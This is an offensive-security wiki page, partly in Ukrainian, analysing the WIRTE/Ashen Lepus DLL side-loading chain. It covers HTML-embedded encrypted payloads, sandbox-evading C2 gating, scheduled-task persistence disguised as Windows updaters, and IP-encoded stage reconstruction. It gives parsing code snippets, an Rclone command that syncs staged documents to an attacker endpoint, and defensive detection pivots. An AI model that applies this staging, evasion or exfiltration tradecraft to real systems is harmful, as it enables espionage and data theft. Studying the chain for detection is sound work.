# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) weaponized repeatable pattern that chains DLL sideloading, staged HTML payloads, and modular .NET backdoors to persist inside Middle Eastern diplomatic networks. The technique is reusable by any operator because it relies on:

- **Archive-based social engineering**: benign PDFs instruct targets to pull a RAR archive from a file-sharing site. The archive bundles a real-looking document viewer EXE, a malicious DLL named after a trusted library (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), and a decoy `Document.pdf`.
- **DLL search order abuse**: the victim double-clicks the EXE, Windows resolves the DLL import from the current directory, and the malicious loader (AshenLoader) executes inside the trusted process while the decoy PDF opens to avoid suspicion.
- **Living-off-the-land staging**: every later stage (AshenStager → AshenOrchestrator → modules) is kept off disk until needed, delivered as encrypted blobs hidden inside otherwise harmless HTML responses.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: the EXE side-loads AshenLoader, which performs host recon, AES-CTR encrypts it, and POSTs it inside rotating parameters such as `token=`, `id=`, `q=`, or `auth=` to API-looking paths (e.g., `/api/v2/account`).
2. **HTML extraction**: the C2 only betrays the next stage when the client IP geolocates to the target region and the `User-Agent` matches the implant, frustrating sandboxes. When the checks pass the HTTP body contains a `<headerp>...</headerp>` blob with the Base64/AES-CTR encrypted AshenStager payload.
3. **Second sideload**: AshenStager is deployed with another legitimate binary that imports `wtsapi32.dll`. The malicious copy injected into the binary fetches more HTML, this time carving `<article>...</article>` to recover AshenOrchestrator.
4. **AshenOrchestrator**: a modular .NET controller that decodes a Base64 JSON config. The config’s `tg` and `au` fields are concatenated/hashed into the AES key, which decrypts `xrk`. The resulting bytes act as an XOR key for every module blob fetched afterwards.
5. **Module delivery**: each module is described through HTML comments that redirect the parser to an arbitrary tag, breaking static rules that look only for `<headerp>` or `<article>`. Modules include persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), and file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Навіть якщо захисники блокують або видаляють певний елемент, оператору достатньо змінити тег, підказаний в HTML-коментарі, щоб відновити доставку.

### Швидкий Helper для витягування (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Нещодавнє дослідження HTML smuggling (Talos) підкреслює payloads, сховані як Base64 strings усередині `<script>` blocks в HTML attachments і декодовані через JavaScript під час виконання. Такий самий трюк можна повторно використати для C2 responses: stage encrypted blobs всередині script tag (або іншого DOM element) і декодувати їх in-memory перед AES/XOR, роблячи сторінку схожою на звичайний HTML. Talos також показує layered obfuscation (identifier renaming plus Base64/Caesar/AES) всередині script tags, що добре мапиться на HTML-staged C2 blobs. Пізніший Talos writeup про **hidden text salting** також релевантний тут: розбиття Base64 за допомогою нерелевантних HTML comments або whitespace достатньо, щоб зламати прості regex extractors, але reconstruction на боці browser залишається тривіальним.

## Recent Variant Notes (2024-2025)

- Check Point спостерігала кампанії WIRTE у 2024 році, які все ще ґрунтувалися на archive-based sideloading, але використовували `propsys.dll` (stagerx64) як першу stage. Stager декодує наступний payload за допомогою Base64 + XOR (key `53`), надсилає HTTP requests із жорстко заданим `User-Agent` і витягує encrypted blobs, вбудовані між HTML tags. В одній гілці stage було reconstructed із довгого списку вбудованих IP strings, decoded через `RtlIpv4StringToAddressA`, а потім concatenated у байти payload.
- OWN-CERT задокументувала ранніші WIRTE tooling, де side-loaded `wtsapi32.dll` dropper захищав strings за допомогою Base64 + TEA і використовував саму назву DLL як decryption key, а потім XOR/Base64-obfuscated host identification data перед відправленням до C2.

## Reconstructing IP-Encoded Stages

Гілка WIRTE 2024 року з `propsys.dll` показує, що наступний PE не обов’язково має існувати як один суцільний HTML blob. Loader може зберігати stage bytes як dotted-quad strings і відновлювати їх за допомогою `RtlIpv4StringToAddressA`, що є патерном, тісно пов’язаним із Hive **IPfuscation** tradecraft. З operational точки зору це корисно, коли actor хоче, щоб HTML page містила те, що виглядає як безпечні IOCs або config data, замість очевидного Base64 payload.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Якщо відновлені байти починаються з `MZ`, ви, ймовірно, напряму реконструювали наступний PE. Якщо ні, перевірте наявність початкового шару XOR/Base64 або невеликих фрагментів-розділювачів між адресами.

## Swappable DLL Names & Host Rotation

Сильна властивість цього патерну в тому, що **HTML/AES/XOR staging backend може залишатися ідентичним, тоді як змінюється лише sideload pair**. WIRTE ротував між `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` і `propsys.dll` у різних кампаніях, що корисно, тому що:

- `propsys.dll` і `wtsapi32.dll` — це буденні назви Windows DLL, яких defenders очікують у `%System32%` / `%SysWOW64%`.
- Публічні каталоги, такі як **HijackLibs**, уже зіставляють багато бінарників, які завантажуватимуть ці DLL names із копії application directory, надаючи операторам replacement hosts без перепроєктування stager.
- Потрібно адаптувати лише export surface для кожного host. HTML parser, AES/XOR routines і module loader зазвичай можна перенести без змін у forwarding proxy DLL.

Для offensive lab work це означає, що можна розділити задачу на **(1) знайти стабільний signed host, який локально резолвить обрану назву DLL** і **(2) повторно використати ту саму staged-HTML loader logic за цією DLL**.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: поточні loaders вбудовують 256-bit keys плюс nonces (наприклад, `{9a 20 51 98 ...}`) і, за потреби, додають шар XOR, використовуючи рядки на кшталт `msasn1.dll` до/після decrypt.
- **Key material variations**: ранні loaders використовували Base64 + TEA для захисту вбудованих рядків, а key для decrypt був derived from malicious DLL name (наприклад, `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: staging servers розділені за tool, розміщені в різних ASNs і інколи fronted by схожими на легітимні subdomains, тож спалення одного stage не розкриває решту.
- **Recon smuggling**: дані, що перелічуються, тепер включають Program Files listings, щоб виявляти high-value apps, і завжди шифруються перед тим, як залишити host.
- **URI churn**: query parameters і REST paths змінюються між кампаніями (`/api/v1/account?token=` → `/api/v2/account?auth=`), знецінюючи крихкі detections.
- **User-Agent pinning + safe redirects**: C2 infrastructure відповідає лише на точні UA strings, а інакше робить redirect на безпечні news/health sites, щоб злитися з трафіком.
- **Gated delivery**: servers geo-fenced і відповідають лише реальним implants. Неавторизовані clients отримують нешкідливий HTML.

## Persistence & Execution Loop

AshenStager створює scheduled tasks, які маскуються під Windows maintenance jobs і виконуються через `svchost.exe`, наприклад:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Ці tasks повторно запускають sideloading chain під час boot або через інтервали, забезпечуючи, щоб AshenOrchestrator міг запитувати свіжі modules без повторного запису на disk.

## Using Benign Sync Clients for Exfiltration

Оператори розміщують diplomatic documents у `C:\Users\Public` (world-readable і не підозріло) через dedicated module, а потім завантажують легітимний [Rclone](https://rclone.org/) binary, щоб синхронізувати цей directory зі сховищем нападника. Unit42 зазначає, що це перший випадок, коли цього актора спостерігали за використанням Rclone для exfiltration, що узгоджується з ширшою тенденцією зловживання легітимними sync tooling, щоб зливатися зі звичайним трафіком:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Оскільки Rclone широко використовується для легітимних backup workflows, defenders мають зосереджуватися на аномальних executions (нові binaries, дивні remotes або раптова синхронізація `C:\Users\Public`).

## Detection Pivots

- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), особливо коли назви DLL overlap with `netutils`, `srvcli`, `dwampi`, `wtsapi32`, or `propsys`.
- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
- Normalize HTML first: **strip comments and collapse whitespace before Base64 extraction**, because hidden-text-salting style evasion can split payloads across comment boundaries.
- Extend HTML hunting to **Base64 strings inside `<script>` blocks** (HTML smuggling-style staging) that are decoded via JavaScript before AES/XOR processing.
- Hunt for repeated calls to **`RtlIpv4StringToAddressA` followed by buffer assembly**, especially when the surrounding strings are long IPv4 lists rather than real network targets.
- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
- Track **C2 redirects** that only return payloads for exact `User-Agent` strings and otherwise bounce to legitimate news/health domains.
- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
{{#include ../../../banners/hacktricks-training.md}}
